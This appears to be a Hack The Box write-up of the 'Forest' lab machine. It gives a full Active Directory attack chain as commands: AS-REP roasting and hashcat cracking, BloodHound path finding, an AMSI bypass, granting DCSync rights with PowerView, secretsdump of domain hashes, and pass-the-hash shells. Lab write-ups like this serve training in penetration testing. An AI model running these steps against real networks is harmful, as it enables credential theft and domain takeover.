---
date: 2025-03-28
categories: [CTF, HTB]
title: "HTB - Forest"
tags: ['bloodhound', 'hashcat', 'impacket', 'kerberos', 'ldap', 'linux', 'nmap', 'privilege escalation', 'rce', 'secretsdump', 'smb', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Forest - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Forest

```bash
nmap 10.129.95.210 -A

```

![image1](../resources/711e7307ff794f6cbf6267013997a959.png)

- Looks like this could be the DC (Kerberos)
- Got the domain from ldap - **htb.local**

- Port 445 SMB is open
- Enumerate with enum4linux

```bash
enum4linux 10.129.95.210

```
- Found users:

![image2](../resources/20f9c52a79b54382b6e591412d9adb91.png)


![image3](../resources/12f7a24d9c9042fa9df1e633361e6493.png)

- <u>Can also use LDAP to enumerate:</u>

```bash
ldapsearch -H ldap://10.129.95.210 -x -s base -b '' "(objectClass=*)" "*" +
```

![image4](../resources/654647aff37743419fe09ff3eb012172.png)

```bash
ldapsearch -H ldap://10.129.95.210 -x -b "DC=htb,DC=local" | grep "dn: CN=" | grep "OU="
```

![image5](../resources/fcedadc34f5c47498612578acbe9a079.png)

<https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>

- Add users in a file (**users**)

- Check if usernames are valid:

```bash
kerbrute userenum --dc 10.129.95.210 -d htb.local users -o validusers.txt

```

![image6](../resources/3d882de76f884541bc79be2f2bf636a0.png)

- Vind vulnerable users:

```bash
impacket-GetNPUsers htb.local/ -users users -no-pass -dc-ip 10.129.95.210

```

![image7](../resources/f025b74aec67441f97fb2deff533359e.png)

- Save the whole hash to a file and use hashcat:

```bash
hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

![image8](../resources/329228a4ba98415d9415ad926177c823.png)

Got credentials for a service account.

- Test with CME:

```bash
crackmapexec smb 10.129.95.210 -u svc-alfresco -p <password>

```

![image9](../resources/df6387c210d444d49f6852fd97b7b6c4.png)

- Remote using WinRM:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p <password>

```

![image10](../resources/b0da291eb004454c94a88fb3b89ba7e3.png)


![image11](../resources/6c1dceeb42bf4cb28ac9f2c67a1d7032.png)

**<u>Priv Esc:</u>**

```bash
whoami /all

```

![image12](../resources/787ff38513e848848c131819de4c95ab.png)

- Part of the:
**BUILTIN\Account Operators**

The Account Operators group grants limited **account creation privileges** to a user.

Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups.

Group members can log in locally to domain controllers

- Upload Sharphound:

```bash
upload SharpHound.exe

```
- Run Sharphound:

```bash
.\SharpHound.exe --CollectionMethods All --Domain htb.local --ZipFileName loot.zip

```
- Download the loot.zip file:

```bash
download 20240205024401_loot.zip

```
- Start Neo4j:

```bash
sudo neo4j console

```
- Open Bloodhound
Drag and drop the loot.zip file into bloodhound

Click on - **Find Shortest Paths to Domain Admins**


![image13](../resources/b259b9483f584490a258a9eb2b83d5b6.png)

If there is loads of old data in bloodhound:

Connect to the neo4j browser gui <http://localhost:7474>

Run:

```bash
MATCH (n)

DETACH DELETE n;

```

![image14](../resources/a81df9fe27cf4b368ca75963582fbcc3.png)


![image15](../resources/b4105ed3e6734f0880074ed44f063fee.png)

- **The user svc-alfresco is part of the Account Operators group**


![image16](../resources/46f99dc060234015a590067222896335.png)

- Click on the Account Operators node and Reachable High Value Targets

![image17](../resources/029cb7f8d2914fdb874d1124d221fd0a.png)


![image18](../resources/c54af6facdca4248872077bab5945087.png)


![image19](../resources/598ff1be2ca242e7b5612919824d2a57.png)

- Account operators has GenericAll to the Exchange Windows Permissions

![image20](../resources/e33572edc1764efbad8bd89ac7c1857d.png)

- And that in turn has WriteDACL to the HTB.LOCAL

![image21](../resources/a004f7b15ae94c44b790748fa5ff5503.png)

- HTB.LOCAL is the domain so we know that all accounts are part of it ie. Administrator

- And clicking on the Domain Admins' node - We can see that Administrator account is a part of that group.
And we need DA

- **<u>To exploit:</u>**

- Create a new user (tooby):

```bash
net user tooby Password123! /add /domain

```
- Add to the group Exchange Windows Permissions

```bash
net group "Exchange Windows Permissions" tooby /add

```
- Open the menu in evil-winrm:

```bash
menu

```

![image22](../resources/0d1d666a37e94b3fbe7869d2595a0d89.png)

- Use Bypass-4MSI - To bypass AV

![image23](../resources/bce6ba48b3934433a7bfae386888855a.png)

- Upload PowerView.ps1 and run it:
  upload PowerView.ps1

```powershell
  . .\PowerView.ps1
  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('htb\tooby', $SecPassword)
  Add-DomainObjectAcl -PrincipalIdentity tooby -Credential $Cred -Rights DCSync
```

- User tooby has DCSync rights now

- Run a DCSync to get hashes:

```bash
impacket-secretsdump htb/tooby:'Password123!'@10.129.95.210 -dc-ip 10.129.95.210
```

![image24](../resources/731b570fcc194ce1b4e5e6b68526e96c.png)

- Got htb.local\Administrator hash

- **<u>Get shell:</u>**

- <u>Psexec:</u>

```bash
impacket-psexec htb/administrator@10.129.95.210 -hashes "<password_hash>"
```

![image25](../resources/829f70572ea947afbe3f7c5eb3617d17.png)


![image26](../resources/c5363a4bedf249f986ba565afdf8074c.png)

- <u>Evil-WinRM:</u>

```bash
evil-winrm -i 10.129.95.210 -u administrator -H "<second_half_of_hash>"
```

![image27](../resources/56b8467c0fcc4dc8932317ea0d9670e5.png)

![image28](../resources/196ec54770d84bb2851cd1ce4788d45e.png)